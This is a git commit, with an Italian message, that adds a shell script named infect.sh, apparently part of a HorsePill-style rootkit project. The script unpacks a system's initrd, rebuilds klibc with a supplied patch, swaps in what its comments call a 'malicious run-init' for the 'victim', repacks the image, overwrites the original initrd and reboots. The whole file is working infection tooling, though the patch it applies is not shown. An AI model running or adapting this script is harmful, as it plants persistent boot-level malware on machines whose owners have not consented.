daf57dd0df5918e6ac0eeab9504363d9704dc37a
alessandro <alessandro.chillotti@outlook.it>
2022-04-30 11:38:41 +0200

    Inserito script di installazione dell'initrd infetto

---
+++ infect.sh
@@ -0,0 +1,43 @@
+#!/bin/sh
+
+# if less than two arguments supplied, display usage 
+if [ $# -ne 2 ] 
+then 
+    echo "Usage: ${0} absolute_path_of_initrd_to_replace absolute_path_of_patch"
+    exit 1
+fi
+
+# prepare the working directories
+mkdir /tmp/horsepill/
+mkdir /tmp/horsepill/initrd-extracted/
+cd /tmp/horsepill
+
+# extract initrd image
+unmkinitramfs $1 ./initrd-extracted
+
+# download the source for klibc
+apt-get build-dep klibc && apt-get source klibc
+
+# build applying the patch
+cd klibc-2.0.7 && quilt import $2 -f && dpkg-buildpackage -j$(nproc) -us -uc -b
+
+# copy malicious run-init to victim
+rm /tmp/horsepill/initrd-extracted/main/usr/bin/run-init
+mv /tmp/horsepill/klibc-2.0.7/usr/kinit/run-init/shared/run-init /tmp/horsepill/initrd-extracted/main/usr/bin/run-init
+
+# add the first microcode firmware
+cd ../initrd-extracted
+cd early
+find . -print0 | cpio --null --create --format=newc > /tmp/horsepill/infected-initrd
+
+# add the second microcode firmware
+cd ../early2
+find kernel -print0 | cpio --null --create --format=newc >> /tmp/horsepill/infected-initrd
+
+# add the ram fs file system
+cd ../main
+find . | cpio --create --format=newc | lz4 -l -c >> /tmp/horsepill/infected-initrd
+
+# replace initrd 
+rm $1 && mv /tmp/horsepill/infected-initrd $1
+reboot
